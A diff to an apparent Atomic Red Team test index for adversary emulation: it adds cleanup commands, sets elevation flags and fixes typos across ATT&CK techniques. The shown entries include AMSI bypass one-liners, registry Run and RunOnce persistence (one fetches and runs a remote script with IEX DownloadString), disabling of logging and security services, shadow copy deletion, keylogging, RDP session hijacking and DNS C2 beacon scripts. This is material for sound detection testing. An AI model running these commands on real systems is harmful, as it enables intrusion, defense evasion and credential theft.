@@ -1513,11 +1513,14 @@ persistence:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -3808,9 +3811,14 @@ persistence:
           default: C:\Path\AtomicRedTeam.exe
       executor:
         name: command_prompt
-        command: |
-          REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
-          REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f
+        command: 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V
+          "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+
+'
+        cleanup_command: 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+          /V "Atomic Red Team" /f
+
+'
     - name: Reg Key RunOnce
       description: 'RunOnce Key Persistence
 
@@ -3824,9 +3832,14 @@ persistence:
           default: C:\Path\AtomicRedTeam.dll
       executor:
         name: command_prompt
-        command: |
-          REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
-          REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
+        command: 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+          /v 1 /d "#{thing_to_execute}"
+
+'
+        cleanup_command: 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+          /v 1 /f
+
+'
     - name: PowerShell Registry RunOnce
       description: 'RunOnce Key Persistence via PowerShell
 
@@ -3843,27 +3856,9 @@ persistence:
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
           set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
-          Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
-    - name: Startup Folder
-      description: 'Add Shortcut To Startup via PowerShell
+        cleanup_command: 'Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 
 '
-      supported_platforms:
-      - windows
-      input_arguments:
-        thing_to_execute:
-          description: Thing to Run
-          type: Path
-          default: C:\Path\AtomicRedTeam.exe
-      executor:
-        name: powershell
-        command: |
-          $TargetFile = "$env:SystemRoot\System32\#{thing_to_execute}"
-          $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
-          $WScriptShell = New-Object -ComObject WScript.Shell
-          $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-          $Shortcut.TargetPath = $TargetFile
-          $Shortcut.Save()
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -3982,8 +3977,11 @@ persistence:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -4015,13 +4013,18 @@ persistence:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
     - name: Powershell Cmdlet Scheduled Task
-      description: "Create an atomic scheduled task that leverages native powershell
-        cmdlets. \nThese could be concidered \"fileless\" scheduled task creation.\n"
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
       supported_platforms:
       - windows
       executor:
@@ -4988,6 +4991,9 @@ persistence:
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
+
+'
+        cleanup_command: 'del #{web_shell_path}
 
 '
   T1084:
@@ -6783,11 +6789,14 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1073:
     technique:
       x_mitre_data_sources:
@@ -7096,8 +7105,10 @@ defense-evasion:
 
 '
     - name: Unload Sysmon Filter Driver
-      description: "Unloads the Sysinternals Sysmon filter driver without stopping
-        the Sysmon service. \n"
+      description: 'Unloads the Sysinternals Sysmon filter driver without stopping
+        the Sysmon service.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -7120,9 +7131,9 @@ defense-evasion:
           fltmc.exe load #{sysmon_driver}
           sc start sysmon
     - name: Disable Windows IIS HTTP Logging
-      description: "Disables HTTP logging on a Windows IIS web server as seen by Threat
-        Group 3390 (Bronze Union). \nThis action requires HTTP logging configurations
-        in IIS to be unlocked.\n"
+      description: |
+        Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
+        This action requires HTTP logging configurations in IIS to be unlocked.
       supported_platforms:
       - windows
       input_arguments:
@@ -7131,9 +7142,17 @@ defense-evasion:
           type: string
           default: Default Web Site
       executor:
-        name: command_prompt
+        name: powershell
+        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {0}
+          else {1}
+
+'
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
           /section:httplogging /dontLog:true
+
+'
+        cleanup_command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
+          /section:httplogging /dontLog:false
 
 '
     - name: Uninstall Sysmon
@@ -7155,8 +7174,9 @@ defense-evasion:
 
 '
     - name: AMSI Bypass - AMSI InitFailed
-      description: "Any easy way to bypass AMSI inspection is it patch the dll in
-        memory setting the \"amsiInitFailed\" function to true. \nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n"
+      description: |
+        Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+        https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
       supported_platforms:
       - windows
       executor:
@@ -7165,9 +7185,9 @@ defense-evasion:
         command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
         cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
     - name: AMSI Bypass - Remove AMSI Provider Reg Key
-      description: "With administrative rights, an adversary can remove the AMSI Provider
-        registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis
-        test removes the Windows Defender provider registry key. \n"
+      description: |
+        With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+        This test removes the Windows Defender provider registry key.
       supported_platforms:
       - windows
       executor:
@@ -7182,8 +7202,10 @@ defense-evasion:
 
 '
     - name: Disable Arbitrary Security Windows Service
-      description: "With administrative rights, an adversary can disable Windows Services
-        related to security products. \n"
+      description: 'With administrative rights, an adversary can disable Windows Services
+        related to security products.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -7201,8 +7223,10 @@ defense-evasion:
           sc.exe config #{service_name} start= auto
           net.exe start #{service_name}
     - name: Disable PowerShell Script Block Logging
-      description: "An adversary may disable PowerShell Script Block Logging to avoid
-        leaving evidence. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      description: |
+        An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
+
+        Credit to Matt Graeber (@mattifestation) for the research.
       supported_platforms:
       - windows
       executor:
@@ -7219,14 +7243,18 @@ defense-evasion:
           $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
           $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
     - name: PowerShell Bypass of AntiMalware Scripting Interface
-      description: "An adversary may bypass Windows Defender AMSI to execute malicious
-        PowerShell code. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      description: |
+        An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.
+
+        Credit to Matt Graeber (@mattifestation) for the research.
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
-        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
+        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
+
+'
   T1107:
     technique:
       x_mitre_data_sources:
@@ -7337,17 +7365,12 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        file_to_delete:
-          description: Path of file to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-cmd\a
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'del /f #{file_to_delete}
-
-'
+        command: |
+          echo "T1107" > %temp%\T1107.txt
+          del /f  %temp%\T1107.txt
     - name: Delete an entire folder - Windows cmd
       description: 'Recursively delete the temporary directory and all files contained
         within it using cmd.exe
@@ -7355,34 +7378,24 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        folder_to_delete:
-          description: Path of folder to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-cmd
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'del /f /S #{folder_to_delete}
-
-'
+        command: |
+          mkdir %temp%\T1107
+          rmdir /s /q %temp%\T1107
     - name: Delete a single file - Windows PowerShell
       description: 'Delete a single file from the temporary directory using Powershell
 
 '
       supported_platforms:
       - windows
-      input_arguments:
-        file_to_delete:
-          description: Path of file to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-ps\a
       executor:
         name: powershell
         elevation_required: false
-        command: 'Remove-Item -path "#{file_to_delete}"
-
-'
+        command: |
+          New-Item $env:TEMP\T1107.txt
+          Remove-Item -path $env:TEMP\T1107.txt
     - name: Delete an entire folder - Windows PowerShell
       description: 'Recursively delete the temporary directory and all files contained
         within it using Powershell
@@ -7398,9 +7411,9 @@ defense-evasion:
       executor:
         name: powershell
         elevation_required: false
-        command: 'Remove-Item -path "#{folder_to_delete}" -recurse
-
-'
+        command: |
+          New-Item $env:TEMP\T1107 -ItemType Directory
+          Remove-Item -path $env:TEMP\T1107 -recurse
     - name: Delete VSS - vssadmin
       description: 'Delete all volume shadow copies with vssadmin.exe
 
@@ -7433,11 +7446,14 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
+        elevation_required: true
         command: |
           bcdedit /set {default} bootstatuspolicy ignoreallfailures
           bcdedit /set {default} recoveryenabled no
     - name: wbadmin
-      description: "This test deletes Windows Backup catalogs. \n"
+      description: 'This test deletes Windows Backup catalogs.
+
+'
       supported_platforms:
       - windows
       executor:
@@ -9482,9 +9498,13 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
           /t REG_DWORD /v HideFileExt /d 1 /f
+
+'
+        cleanup_command: 'reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+          /v HideFileExt /f
 
 '
     - name: Modify Registry of Local Machine - cmd
@@ -9498,6 +9518,10 @@ defense-evasion:
         elevation_required: true
         command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
           /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
+
+'
+        cleanup_command: 'reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+          /v SecurityHealth /f
 
 '
     - name: Modify Registry of Another User Profile
@@ -9564,9 +9588,10 @@ defense-evasion:
           [gc]::Collect()
           reg unload "HKU\$($ProfileList[$p].SID)"
     - name: Modify registry to store logon credentials
-      description: "Sets registry key that will tell windows to store plaintext passwords
+      description: 'Sets registry key that will tell windows to store plaintext passwords
         (making the system vulnerable to clear text / cleartext password dumping)
-        \n"
+
+'
       supported_platforms:
       - windows
       executor:
@@ -9610,7 +9635,9 @@ defense-evasion:
           $EncodedCommand
           Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
         cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
-          -Name #{registry_entry_storage}'
+          -Name #{registry_entry_storage}
+
+'
   T1170:
     technique:
       x_mitre_data_sources:
@@ -13204,11 +13231,14 @@ privilege-escalation:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -14352,8 +14382,11 @@ privilege-escalation:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -14385,13 +14418,18 @@ privilege-escalation:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
     - name: Powershell Cmdlet Scheduled Task
-      description: "Create an atomic scheduled task that leverages native powershell
-        cmdlets. \nThese could be concidered \"fileless\" scheduled task creation.\n"
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
       supported_platforms:
       - windows
       executor:
@@ -14925,6 +14963,9 @@ privilege-escalation:
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
+
+'
+        cleanup_command: 'del #{web_shell_path}
 
 '
 impact:
@@ -15975,7 +16016,7 @@ discovery:
           net user
           net user /domain
           get-localuser
-          get-localgroupmembers -group Users
+          get-localgroupmember -group Users
           cmdkey.exe /list
           ls C:/Users
           get-childitem C:\Users\
@@ -17627,7 +17668,7 @@ discovery:
       modified: '2019-09-27T19:03:39.143Z'
       identifier: T1518
     atomic_tests:
-    - name: Find and Display Iinternet Explorer Browser Version
+    - name: Find and Display Internet Explorer Browser Version
       description: 'Adversaries may attempt to get a listing of non-security related
         software that is installed on the system. Adversaries may use the information
         from Software Discovery during automated discovery to shape follow-on behaviors
@@ -17642,6 +17683,20 @@ discovery:
           /v svcVersion
 
 '
+    - name: Applications Installed
+      description: 'Adversaries may attempt to get a listing of all software that
+        is installed on the system. Adversaries may use the information from Software
+        Discovery during automated discovery to shape follow-on behaviors
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          POWERSHELL.EXE "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
+          powershell.exe "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
   T1082:
     technique:
       x_mitre_permissions_required:
@@ -19244,19 +19299,6 @@ credential-access:
         command: 'grep -ri password #{file_path}
 
 '
-    - name: Runs Mimikatz & Mimikittenz by name
-      description: 'Mimikatz/kittenz - This will require a Mimikatz executable or
-        invoke-mimikittenz ps module.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          invoke-mimikittenz
-          mimikatz.exe
     - name: Extracting passwords with findstr
       description: 'Extracting Credentials from Files
 
@@ -19269,7 +19311,7 @@ credential-access:
         command: |
           findstr /si pass *.xml | *.doc | *.txt | *.xls
           ls -R | select-string -Pattern password
-    - name: Access "unattend.xml"
+    - name: Access unattend.xml
       description: 'Attempts to access unattend.xml, where credentials are commonly
         stored, within the Panther directory where installation logs are stored.
 
@@ -19280,8 +19322,8 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: |
-          cmd /c type C:\Windows\Panther\unattend.xml > nul 2>&1
-          cmd /c type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
   T1214:
     technique:
       x_mitre_permissions_required:
@@ -19566,10 +19608,16 @@ credential-access:
         filepath:
           description: Name of the local file, include path.
           type: Path
-          default: c:\key.log
+          default: "$env:TEMP\\key.log"
       executor:
         name: powershell
-        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        elevation_required: true
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
+        cleanup_command: 'Remove-Item $env:TEMP\key.log
+
+'
   T1141:
     technique:
       x_mitre_data_sources:
@@ -21393,7 +21441,6 @@ execution:
     - name: Invoke-AppPathBypass
       description: |
         Note: Windows 10 only
-
         Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
       supported_platforms:
       - windows
@@ -22099,8 +22146,11 @@ execution:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -22132,13 +22182,18 @@ execution:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
     - name: Powershell Cmdlet Scheduled Task
-      description: "Create an atomic scheduled task that leverages native powershell
-        cmdlets. \nThese could be concidered \"fileless\" scheduled task creation.\n"
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
       supported_platforms:
       - windows
       executor:
@@ -22301,9 +22356,11 @@ execution:
       identifier: T1035
     atomic_tests:
     - name: Execute a Command as a Service
-      description: "Creates a service specifying an aribrary command and executes
+      description: 'Creates a service specifying an aribrary command and executes
         it. When executing commands such as PowerShell, the service will report that
-        it did not start correctly even when code executes properly. \n"
+        it did not start correctly even when code executes properly.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -22323,6 +22380,30 @@ execution:
           sc.exe create #{service_name} binPath= #{executable_command}
           sc.exe start #{service_name}
           sc.exe delete #{service_name}
+    - name: Use PsExec to execute a command on a remote host
+      description: |
+        Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
+        Will run a command on a remote host
+      supported_platforms:
+      - windows
+      input_arguments:
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+        remote_host:
+          description: Remote hostname or IP address
+          type: string
+          default: localhost
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: 'if(Test-Path #{psexec_path}) {0} else {1}
+
+'
+        command: '#{psexec_path} \\#{remote_host} "C:\Windows\System32\calc.exe"
+
+'
   T1218:
     technique:
       x_mitre_data_sources:
@@ -24049,7 +24130,9 @@ lateral-movement:
           query user
           sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
           net start sesshijack
-          sc.exe delete sesshijack
+        cleanup_command: 'sc.exe delete sesshijack
+
+'
     - name: RDPto-DomainController
       description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
         RDPs to (%logonserver%) as the current user
@@ -25374,10 +25457,16 @@ collection:
         filepath:
           description: Name of the local file, include path.
           type: Path
-          default: c:\key.log
+          default: "$env:TEMP\\key.log"
       executor:
         name: powershell
-        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        elevation_required: true
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
+        cleanup_command: 'Remove-Item $env:TEMP\key.log
+
+'
   T1113:
     technique:
       x_mitre_data_sources:
@@ -26782,9 +26871,9 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: ".\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain}
-          -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter}
-          -RunTime #{runtime}\n"
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
     - name: DNS Long Domain Query
       description: |
         This test simulates an infected host returning data to a command and control server using long domain names.
@@ -26808,8 +26897,9 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: ".\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain}
-          -QueryType #{query_type}"
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
   T1065:
     technique:
       x_mitre_data_sources:
